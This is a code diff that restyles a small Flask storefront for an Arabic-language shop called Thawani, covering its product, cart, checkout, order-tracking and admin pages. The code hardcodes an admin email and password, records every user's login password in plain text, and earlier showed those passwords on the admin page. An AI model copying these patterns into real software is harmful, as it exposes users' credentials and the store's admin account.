@@ -11,23 +11,15 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    # جدول المنتجات
     c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
-    # جدول السلة مع الكمية
     c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
-    # جدول الأصناف (الأقسام)
     c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
-    # جدول سجل دخول المستخدمين
     c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
-    # جدول الطلبات مع تتبع الوقت والحالة
     c.execute('''CREATE TABLE IF NOT EXISTS orders (
         id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, location TEXT, 
         card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
         accepted_at TIMESTAMP, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
-    # جدول التقييمات مع الصور
     c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, review_img TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
-    
-    # تأكيد وجود قسم افتراضي
     c.execute("SELECT COUNT(*) FROM categories")
     if c.fetchone()[0] == 0:
         c.execute("INSERT INTO categories (name) VALUES ('الكل')")
@@ -38,36 +30,40 @@ init_db()
 ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
 ADMIN_PASS = "qaws54321"
 
-# --- التنسيق الكامل (CSS) لجميع الشاشات ---
+# --- التنسيق الاحترافي الجديد (CSS Modern UI) ---
 CSS = """
 <style>
-    :root { --main: #2ecc71; --dark: #27ae60; --bg: #f9fbf9; --text: #2c3e50; }
-    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); -webkit-tap-highlight-color: transparent; }
-    header { background: white; padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 15px rgba(0,0,0,0.05); position: sticky; top:0; z-index:1000; border-bottom: 3px solid var(--main); }
-    .search-bar { padding: 10px 20px; background: white; border-bottom: 1px solid #eee; display: flex; gap: 10px; }
-    .search-bar input { border: 2px solid #eee; border-radius: 8px; padding: 10px 15px; width: 100%; outline: none; transition: 0.3s; }
-    .search-bar input:focus { border-color: var(--main); }
-    .search-bar button { background: var(--main); color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-    .nav-cats { display: flex; gap: 10px; overflow-x: auto; padding: 15px; background: white; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.02); scrollbar-width: none; }
-    .nav-cats::-webkit-scrollbar { display: none; }
-    .nav-cats a { background: #f1f2f6; padding: 8px 18px; border-radius: 20px; text-decoration: none; color: #555; white-space: nowrap; font-weight: bold; border: 1px solid #dfe4ea; transition: 0.3s; }
-    .nav-cats a.active { background: var(--main); color: white; border-color: var(--main); }
-    .container { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; padding: 15px; }
-    .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eef7f0; position: relative; transition: transform 0.2s; }
-    .card img { width: 100%; height: 160px; object-fit: cover; }
-    .card-body { padding: 12px; }
-    .price-tag { font-size: 18px; color: var(--main); font-weight: bold; margin: 5px 0; }
-    .btn { background: var(--main); color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-weight: bold; width: 100%; box-sizing: border-box; transition: 0.3s; }
-    input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; outline: none; font-family: inherit; }
-    table { width: 100%; border-collapse: collapse; background: white; margin-bottom: 20px; }
-    th, td { padding: 12px; border: 1px solid #eee; text-align: center; font-size: 13px; }
-    th { background: var(--main); color: white; }
-    .admin-section { background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eee; }
+    :root { --main: #10b981; --main-dark: #059669; --bg: #f8fafc; --text: #1e293b; --white: #ffffff; }
+    body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); padding-bottom: 30px; }
+    header { background: var(--white); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 10px rgba(0,0,0,0.05); position: sticky; top:0; z-index:1000; }
+    .logo { font-size: 22px; font-weight: 800; color: var(--main); letter-spacing: -1px; text-decoration: none; }
     
-    /* ستايل الشاحنة وتتبع الـ 7 أيام */
-    .track-bg { background: #eee; height: 12px; border-radius: 10px; position: relative; margin: 40px 10px 10px 10px; border: 1px solid #ddd; }
-    .truck-icon { position: absolute; top: -30px; font-size: 28px; transition: right 0.5s linear; }
-    .track-labels { display: flex; justify-content: space-between; padding: 0 5px; font-size: 11px; color: #888; font-weight: bold; }
+    .search-container { padding: 12px 15px; background: var(--white); }
+    .search-wrapper { position: relative; display: flex; align-items: center; background: #f1f5f9; border-radius: 12px; padding: 5px 15px; }
+    .search-wrapper input { border: none; background: transparent; padding: 10px 5px; width: 100%; outline: none; font-size: 14px; }
+    .search-wrapper button { background: none; border: none; cursor: pointer; font-size: 18px; }
+
+    .nav-cats { display: flex; gap: 10px; overflow-x: auto; padding: 15px; scrollbar-width: none; background: var(--bg); }
+    .nav-cats::-webkit-scrollbar { display: none; }
+    .nav-cats a { background: var(--white); padding: 8px 20px; border-radius: 25px; text-decoration: none; color: #64748b; white-space: nowrap; font-size: 14px; font-weight: 600; transition: 0.3s; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+    .nav-cats a.active { background: var(--main); color: white; }
+
+    .container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 12px; }
+    .card { background: var(--white); border-radius: 16px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); transition: 0.2s; border: 1px solid #f1f5f9; }
+    .card img { width: 100%; height: 150px; object-fit: cover; }
+    .card-info { padding: 10px; }
+    .card-info b { font-size: 14px; color: #334155; display: block; margin-bottom: 4px; height: 38px; overflow: hidden; }
+    .card-price { color: var(--main-dark); font-weight: 800; font-size: 16px; }
+    
+    .btn-main { background: var(--main); color: white; border: none; padding: 10px; border-radius: 10px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-weight: 700; width: 100%; margin-top: 8px; transition: 0.2s; font-size: 14px; }
+    .btn-main:active { transform: scale(0.98); background: var(--main-dark); }
+    
+    .admin-badge { position: absolute; top: 8px; left: 8px; background: #ef4444; color: white; padding: 4px; border-radius: 8px; font-size: 12px; z-index: 5; text-decoration:none; }
+    
+    .track-bg { background: #e2e8f0; height: 8px; border-radius: 10px; position: relative; margin: 30px 0 10px 0; }
+    .truck-icon { position: absolute; top: -25px; font-size: 20px; }
+    
+    input, select, textarea { width: 100%; padding: 12px; border: 1.5px solid #e2e8f0; border-radius: 12px; background: white; margin-bottom: 10px; }
 </style>
 """
 
@@ -77,7 +73,7 @@ HEADER_HTML = f"""
 <head>
     <meta charset='UTF-8'>
     <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
-    <title>متجر ثواني | عُمان</title>
+    <title>متجر ثواني</title>
     {CSS}
 </head>
 <body>
@@ -102,50 +98,47 @@ def index():
     conn.close()
     return render_template_string(HEADER_HTML + """
     <header>
-        <h2 style="color:var(--main); margin:0; font-weight:900;">🌿 THAWANI</h2>
-        <div style="display:flex; gap:12px; align-items:center;">
-            <a href="/orders_history" style="text-decoration:none; font-size:13px; font-weight:bold; color:var(--text); background:#f1f2f6; padding:5px 10px; border-radius:15px;">طلباتي 📦</a>
-            <a href="/cart" style="text-decoration:none; font-size:22px;">🛒</a>
+        <a href="/" class="logo">THAWANI</a>
+        <div style="display:flex; gap:15px; align-items:center;">
+            <a href="/orders_history" style="text-decoration:none;">📦</a>
+            <a href="/cart" style="text-decoration:none; position:relative;">🛒</a>
             {% if session.get('is_admin') %}<a href="/admin">⚙️</a>{% endif %}
-            <a href="/logout" style="text-decoration:none; color:red; font-weight:bold;">❌</a>
+            <a href="/logout" style="text-decoration:none; color:#f43f5e;">❌</a>
         </div>
     </header>
-    <div class="search-bar">
-        <form action="/" style="display:flex; width:100%; gap:5px;">
-            <input type="text" name="q" placeholder="ابحث عن منتج..." value="{{request.args.get('q', '')}}">
+    
+    <div class="search-container">
+        <form action="/" class="search-wrapper">
             <button type="submit">🔍</button>
+            <input type="text" name="q" placeholder="ابحث عن بضاعتك..." value="{{request.args.get('q', '')}}">
         </form>
     </div>
+
     <div class="nav-cats">
         <a href="/" class="{{ 'active' if not request.args.get('cat') or request.args.get('cat')=='الكل' }}">الكل</a>
         {% for c in cats %}
             <a href="/?cat={{c['name']}}" class="{{ 'active' if request.args.get('cat') == c['name'] }}">{{c['name']}}</a>
         {% endfor %}
     </div>
+
     <div class="container">
         {% for p in prods %}
-        <div class="card">
+        <div class="card" style="position:relative;">
             {% if session.get('is_admin') %}
-            <a href="/delete_product/{{p['id']}}" onclick="return confirm('هل تريد حذف هذا المنتج نهائياً؟')" style="position:absolute; top:8px; left:8px; background:red; color:white; width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; text-decoration:none; z-index:10;">🗑️</a>
+            <a href="/delete_product/{{p['id']}}" class="admin-badge" onclick="return confirm('حذف؟')">🗑️</a>
             {% endif %}
             <a href="/product/{{p['id']}}"><img src="/static/uploads/{{p['img']}}"></a>
-            <div class="card-body">
-                <b style="font-size:14px; display:block; height:40px; overflow:hidden;">{{p['name']}}</b>
-                <div class="price-tag">{{p['price']}} OMR</div>
-                <a href="/product/{{p['id']}}" class="btn">عرض التفاصيل</a>
+            <div class="card-info">
+                <b>{{p['name']}}</b>
+                <div class="card-price">{{p['price']}} OMR</div>
+                <a href="/product/{{p['id']}}" class="btn-main">اشتري الآن</a>
             </div>
         </div>
         {% endfor %}
     </div>
     """, cats=cats, prods=prods)
 
-@app.route('/delete_product/<int:id>')
-def delete_product(id):
-    if session.get('is_admin'):
-        conn = sqlite3.connect('database.db')
-        conn.execute("DELETE FROM products WHERE id=?", (id,))
-        conn.commit(); conn.close()
-    return redirect('/')
+# --- بقية الـ Routes مع تعديل بسيط في التصميم البصري ---
 
 @app.route('/product/<int:id>', methods=['GET', 'POST'])
 def product(id):
@@ -164,43 +157,46 @@ def product(id):
     revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
     conn.close()
     return render_template_string(HEADER_HTML + """
-    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تفاصيل المنتج</h3><div></div></header>
-    <div style="max-width:600px; margin:auto; padding:20px;">
-        <img src="/static/uploads/{{p['img']}}" style="width:100%; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-        <h2>{{p['name']}}</h2>
-        <div class="price-tag" style="font-size:26px; margin-bottom:20px;">{{p['price']}} OMR</div>
-        <form action="/add_to_cart/{{p['id']}}" style="display:flex; gap:10px; margin-bottom:30px;">
-            <input type="number" name="qty" value="1" min="1" style="width:80px; text-align:center;">
-            <button class="btn">إضافة إلى السلة 🛒</button>
+    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">تفاصيل المنتج</h3><div></div></header>
+    <div style="max-width:600px; margin:auto; padding:15px;">
+        <img src="/static/uploads/{{p['img']}}" style="width:100%; border-radius:20px; box-shadow:0 10px 20px rgba(0,0,0,0.05);">
+        <h2 style="margin-top:15px;">{{p['name']}}</h2>
+        <div class="card-price" style="font-size:24px;">{{p['price']}} OMR</div>
+        <form action="/add_to_cart/{{p['id']}}" style="display:flex; gap:10px; margin:20px 0;">
+            <input type="number" name="qty" value="1" min="1" style="width:70px; margin-bottom:0;">
+            <button class="btn-main" style="margin-top:0;">إضافة للسلة 🛒</button>
         </form>
-        <hr>
-        <div style="margin-top:20px;">
-            <h3>⭐ تقييمات العملاء</h3>
-            <form method="POST" enctype="multipart/form-data" style="background:#f1f2f6; padding:20px; border-radius:12px;">
-                <label>التقييم:</label>
-                <select name="rating">
-                    <option value="5">⭐⭐⭐⭐⭐ ممتاز</option>
-                    <option value="4">⭐⭐⭐⭐ جيد جداً</option>
-                    <option value="3">⭐⭐⭐ متوسط</option>
-                </select>
-                <textarea name="comment" placeholder="اكتب تجربتك هنا..." required rows="3"></textarea>
-                <label>أضف صورة (اختياري):</label>
-                <input type="file" name="review_img">
-                <button class="btn" style="background:#34495e; margin-top:10px;">إرسال التقييم</button>
-            </form>
-            {% for r in revs %}
-            <div style="border-bottom:1px solid #eee; padding:20px 0;">
-                <div style="display:flex; justify-content:space-between;">
-                    <b style="color:var(--main);">{{r['user_email']}}</b>
-                    <span>{{'⭐'*r['rating']}}</span>
-                </div>
-                <p style="margin:10px 0;">{{r['comment']}}</p>
-                {% if r['review_img'] %}<img src="/static/uploads/{{r['review_img']}}" style="width:120px; border-radius:8px; border:1px solid #ddd;">{% endif %}
-                <div style="font-size:10px; color:#999;">{{r['time']}}</div>
+        <hr style="border:0; border-top:1px solid #eee;">
+        <h3>⭐ التقييمات</h3>
+        <form method="POST" enctype="multipart/form-data" style="background:#f1f5f9; padding:15px; border-radius:15px;">
+            <select name="rating">
+                <option value="5">⭐⭐⭐⭐⭐ ممتاز</option>
+                <option value="4">⭐⭐⭐⭐ جيد جداً</option>
+                <option value="3">⭐⭐⭐ عادي</option>
+            </select>
+            <textarea name="comment" placeholder="رأيك يهمنا..." required rows="2"></textarea>
+            <input type="file" name="review_img">
+            <button class="btn-main" style="background:#334155;">نشر التقييم</button>
+        </form>
+        {% for r in revs %}
+        <div style="border-bottom:1px solid #f1f5f9; padding:15px 0;">
+            <div style="display:flex; justify-content:space-between; font-size:12px;">
+                <b>{{r['user_email'].split('@')[0]}}</b>
+                <span>{{'⭐'*r['rating']}}</span>
             </div>
-            {% endfor %}
+            <p style="margin:5px 0; font-size:14px;">{{r['comment']}}</p>
+            {% if r['review_img'] %}<img src="/static/uploads/{{r['review_img']}}" style="width:100px; border-radius:10px; margin-top:5px;">{% endif %}
         </div>
+        {% endfor %}
     </div>""", p=p, revs=revs)
+
+@app.route('/delete_product/<int:id>')
+def delete_product(id):
+    if session.get('is_admin'):
+        conn = sqlite3.connect('database.db')
+        conn.execute("DELETE FROM products WHERE id=?", (id,))
+        conn.commit(); conn.close()
+    return redirect('/')
 
 @app.route('/add_to_cart/<int:id>')
 def add_to_cart(id):
@@ -223,24 +219,24 @@ def cart():
     total = sum(i['price'] * i['quantity'] for i in items)
     conn.close()
     return render_template_string(HEADER_HTML + """
-    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">سلة المشتريات</h3><div></div></header>
-    <div style="padding:20px; max-width:600px; margin:auto;">
+    <header><a href="/" style="text-decoration:none; font-size:20px;">🔙</a> <h3 style="margin:0;">السلة</h3><div></div></header>
+    <div style="padding:15px; max-width:600px; margin:auto;">
         {% for i in items %}
-        <div style="background:white; padding:15px; border-radius:12px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #eee;">
-            <div><b>{{i['name']}}</b><br><small>{{i['quantity']}} × {{i['price']}} OMR</small></div>
-            <div style="display:flex; align-items:center; gap:15px;">
-                <b style="color:var(--main);">{{ i['price'] * i['quantity'] }} OMR</b>
-                <a href="/cart?action=delete&id={{i['id']}}" style="text-decoration:none; font-size:18px;">🗑️</a>
+        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #f1f5f9;">
+            <div><b style="font-size:14px;">{{i['name']}}</b><br><small style="color:#64748b;">{{i['quantity']}} × {{i['price']}} OMR</small></div>
+            <div style="display:flex; align-items:center; gap:10px;">
+                <b class="card-price">{{ i['price'] * i['quantity'] }} OMR</b>
+                <a href="/cart?action=delete&id={{i['id']}}" style="text-decoration:none;">🗑️</a>
             </div>
         </div>
         {% endfor %}
         {% if items %}
-        <div style="background:white; padding:20px; border-radius:12px; margin-top:20px; text-align:center; border:2px solid var(--main);">
-            <h2 style="margin:0;">الإجمالي: {{total}} OMR</h2>
-            <a href="/checkout" class="btn" style="margin-top:15px; font-size:18px;">إتمام الطلب والدفع 💳</a>
+        <div style="background:white; padding:20px; border-radius:20px; margin-top:20px; text-align:center; border:1.5px solid var(--main);">
+            <div style="font-size:20px; font-weight:800;">الإجمالي: {{total}} OMR</div>
+            <a href="/checkout" class="btn-main" style="margin-top:15px; padding:15px;">إتمام الشراء 💳</a>
         </div>
         {% else %}
-        <div style="text-align:center; padding:100px 20px; color:#999;"><h3>السلة فارغة حالياً..</h3><a href="/" class="btn">تصفح المنتجات</a></div>
+        <div style="text-align:center; padding:80px 20px;"><h3>سلتك فارغة</h3><a href="/" class="btn-main">تسوّق الآن</a></div>
         {% endif %}
     </div>""", items=items, total=total)
 
@@ -260,17 +256,17 @@ def checkout():
         conn.commit(); conn.close()
         return redirect('/orders_history')
     return render_template_string(HEADER_HTML + """
-    <header><a href="/cart" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تأكيد الطلب</h3><div></div></header>
+    <header><a href="/cart" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">تأكيد الدفع</h3><div></div></header>
     <div style="padding:20px; max-width:500px; margin:auto;">
         <form method="POST" enctype="multipart/form-data">
-            <label>الاسم بالكامل:</label><input name="full_name" required>
-            <label>رقم الهاتف (واتساب):</label><input name="phone" required>
-            <label>العنوان بالتفصيل:</label><textarea name="location" required rows="3"></textarea>
-            <div style="background:#fff3cd; padding:15px; border-radius:10px; margin:15px 0; border:1px solid #ffeeba;">
-                <p style="margin:0; font-size:14px;">يرجى إرفاق صورة إيصال التحويل البنكي لإتمام الطلب.</p>
+            <input name="full_name" placeholder="الاسم الثلاثي" required>
+            <input name="phone" placeholder="رقم الواتساب" required>
+            <textarea name="location" placeholder="العنوان بالتفصيل" required rows="3"></textarea>
+            <div style="background:#fef3c7; padding:15px; border-radius:12px; margin:10px 0; font-size:13px; color:#92400e;">
+                قم بإرفاق صورة إيصال التحويل لإكمال العملية.
             </div>
             <input type="file" name="card_img" required>
-            <button class="btn" style="margin-top:20px;">إرسال الطلب الآن ✅</button>
+            <button class="btn-main" style="margin-top:15px; padding:15px;">إرسال الطلب ✅</button>
         </form>
     </div>""")
 
@@ -291,30 +287,22 @@ def orders_history():
         except: return 0
 
     return render_template_string(HEADER_HTML + """
-    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">طلباتي 📦</h3><div></div></header>
-    <div style="padding:20px; max-width:600px; margin:auto;">
+    <header><a href="/" style="text-decoration:none;">🔙</a> <h3 style="margin:0;">طلباتي</h3><div></div></header>
+    <div style="padding:15px; max-width:600px; margin:auto;">
         {% for o in ords %}
-        <div style="background:white; padding:15px; margin-bottom:20px; border-radius:12px; border:1px solid #eee; box-shadow:0 2px 8px rgba(0,0,0,0.05);">
-            <div style="display:flex; justify-content:space-between; align-items:center;">
-                <b>طلب رقم #{{o['id']}}</b>
-                <span style="font-size:12px; font-weight:bold; padding:5px 12px; border-radius:15px; background:{{'#d4edda' if o['status']=='تم القبول' else '#f8d7da' if o['status']=='تم الرفض' else '#fff3cd'}}; color:{{'#155724' if o['status']=='تم القبول' else '#721c24' if o['status']=='تم الرفض' else '#856404'}};">
+        <div style="background:white; padding:15px; margin-bottom:15px; border-radius:15px; border:1px solid #f1f5f9;">
+            <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                <span style="font-size:12px; color:#64748b;">#{{o['id']}}</span>
+                <span style="font-size:12px; font-weight:bold; padding:4px 10px; border-radius:10px; 
+                background:{{'#dcfce7' if o['status']=='تم القبول' else '#fee2e2' if o['status']=='تم الرفض' else '#fef3c7'}}; 
+                color:{{'#166534' if o['status']=='تم القبول' else '#991b1b' if o['status']=='تم الرفض' else '#92400e'}};">
                 {{o['status']}}</span>
             </div>
-            
-            {% if o['status'] == 'تم الرفض' %}
-            <div style="color:red; background:#fce4e4; padding:10px; border-radius:8px; margin:10px 0; font-size:13px; font-weight:bold;">
-                تم رفض طلبك، يرجى إعادة المحاولة من جديد.
-            </div>
-            {% elif o['status'] == 'تم القبول' %}
-            <div style="color:green; background:#e8f5e9; padding:10px; border-radius:8px; margin:10px 0; font-size:13px; font-weight:bold;">
-                تمت الموافقة على طلبك! سيصلك خلال 7 أيام.
-            </div>
+            {% if o['status'] == 'تم القبول' %}
             <div class="track-bg"><div class="truck-icon" style="right: {{ get_progress(o['accepted_at']) }}%;">🚚</div></div>
-            <div class="track-labels"><span>جاري الشحن</span><span>يصل قريباً</span></div>
             {% endif %}
-            
-            <div style="margin-top:15px; font-size:14px; color:#555;">{{o['items_details']}}</div>
-            <div style="margin-top:5px; font-weight:bold; color:var(--main);">الإجمالي: {{o['total_price']}} OMR</div>
+            <div style="font-size:14px;">{{o['items_details']}}</div>
+            <div style="font-weight:bold; color:var(--main-dark); margin-top:5px;">{{o['total_price']}} OMR</div>
         </div>
         {% endfor %}
     </div>""", ords=ords, get_progress=get_progress)
@@ -331,7 +319,6 @@ def admin():
             conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
         conn.commit()
     
-    # أوامر القبول والرفض
     action = request.args.get('action'); oid = request.args.get('id')
     if action and oid:
         if action == 'accept':
@@ -346,51 +333,37 @@ def admin():
     logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
     conn.close()
     return render_template_string(HEADER_HTML + """
-    <header><h3>لوحة الإدارة</h3><a href="/" style="text-decoration:none;">خروج</a></header>
-    <div style="padding:20px;">
-        <div class="admin-section">
-            <h4>➕ إضافة صنف (قسم جديد)</h4>
+    <header><h3>لوحة التحكم</h3><a href="/" style="text-decoration:none;">إغلاق</a></header>
+    <div style="padding:15px;">
+        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:20px;">
+            <h4>إضافة قسم</h4>
             <form method="POST" style="display:flex; gap:10px;">
-                <input name="cat_name" placeholder="اسم القسم (مثلاً: شدات)" required>
-                <button name="add_cat" class="btn" style="width:120px;">حفظ القسم</button>
+                <input name="cat_name" placeholder="اسم القسم" required style="margin-bottom:0;">
+                <button name="add_cat" class="btn-main" style="width:100px; margin-top:0;">حفظ</button>
             </form>
         </div>
-        
-        <div class="admin-section">
-            <h4>📦 إضافة منتج جديد</h4>
+        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:20px;">
+            <h4>إضافة منتج</h4>
             <form method="POST" enctype="multipart/form-data">
                 <input name="name" placeholder="اسم المنتج" required>
                 <input name="price" placeholder="السعر" required>
-                <select name="cat">
-                    {% for c in cats %}<option value="{{c['name']}}">{{c['name']}}</option>{% endfor %}
-                </select>
+                <select name="cat">{% for c in cats %}<option value="{{c['name']}}">{{c['name']}}</option>{% endfor %}</select>
                 <input type="file" name="img" required>
-                <button name="add_product" class="btn">إضافة للمتجر</button>
+                <button name="add_product" class="btn-main">إضافة للمتجر</button>
             </form>
         </div>
-
-        <h4>📑 الطلبات الأخيرة</h4>
+        <h4>الطلبات</h4>
         {% for o in orders %}
-        <div style="background:white; padding:15px; border-radius:12px; margin-bottom:15px; border:1px solid #ddd;">
-            <b>العميل: {{o['full_name']}}</b> ({{o['phone']}})<br>
+        <div style="background:white; padding:15px; border-radius:15px; margin-bottom:10px; border:1px solid #ddd;">
+            <b>{{o['full_name']}}</b> ({{o['phone']}})<br>
             <small>{{o['items_details']}}</small><br>
-            <b>المبلغ: {{o['total_price']}} OMR</b><br>
-            <div style="margin:10px 0;">
-                <a href="/admin?action=accept&id={{o['id']}}" class="btn" style="display:inline-block; width:auto; padding:5px 15px; background:#2ecc71;">قبول ✅</a>
-                <a href="/admin?action=reject&id={{o['id']}}" class="btn" style="display:inline-block; width:auto; padding:5px 15px; background:#e74c3c; margin-right:10px;">رفض ❌</a>
+            <div style="margin-top:10px;">
+                <a href="/admin?action=accept&id={{o['id']}}" style="color:green; text-decoration:none; font-weight:bold;">قبول ✅</a>
+                <a href="/admin?action=reject&id={{o['id']}}" style="color:red; text-decoration:none; font-weight:bold; margin-right:15px;">رفض ❌</a>
             </div>
-            <p>صورة الإيصال:</p>
-            <a href="/static/uploads/{{o['card_img']}}" target="_blank"><img src="/static/uploads/{{o['card_img']}}" style="width:120px; border-radius:5px; border:1px solid #ccc;"></a>
+            <img src="/static/uploads/{{o['card_img']}}" style="width:80px; margin-top:10px; border-radius:8px;">
         </div>
         {% endfor %}
-
-        <h4>👤 سجل دخول المستخدمين</h4>
-        <div style="overflow-x:auto;">
-            <table>
-                <tr><th>الإيميل</th><th>الباسورد</th><th>التاريخ</th></tr>
-                {% for l in logs %}<tr><td>{{l['email']}}</td><td>{{l['password']}}</td><td>{{l['time']}}</td></tr>{% endfor %}
-            </table>
-        </div>
     </div>""", cats=cats, orders=orders, logs=logs)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -401,13 +374,14 @@ def login():
         session['user'], session['is_admin'] = email, (email == ADMIN_MAIL and password == ADMIN_PASS)
         return redirect('/')
     return render_template_string(HEADER_HTML + """
-    <div style="display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px;">
-        <div style='background:white; padding:40px; border-radius:25px; box-shadow:0 10px 40px rgba(0,0,0,0.1); width:100%; max-width:400px; text-align:center;'>
-            <h1 style="color:var(--main); margin-bottom:30px; font-weight:900;">THAWANI</h1>
+    <div style="display:flex; justify-content:center; align-items:center; min-height:90vh; padding:20px;">
+        <div style='background:white; padding:30px; border-radius:30px; box-shadow:0 10px 40px rgba(0,0,0,0.05); width:100%; max-width:400px; text-align:center;'>
+            <h1 class="logo" style="font-size:35px; margin-bottom:10px;">THAWANI</h1>
+            <p style="color:#64748b; margin-bottom:30px;">أهلاً بك في متجرك المفضل</p>
             <form method='POST'>
                 <input type="email" name='email' placeholder='البريد الإلكتروني' required>
                 <input type='password' name='password' placeholder='كلمة المرور' required>
-                <button class='btn' style="padding:15px; font-size:18px;">دخول آمن 🔒</button>
+                <button class='btn-main' style="padding:15px; font-size:16px;">دخول آمن</button>
             </form>
         </div>
     </div>""")
@@ -418,4 +392,4 @@ def logout():
 
 application = app
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=10000) 
+    app.run(host='0.0.0.0', port=10000)
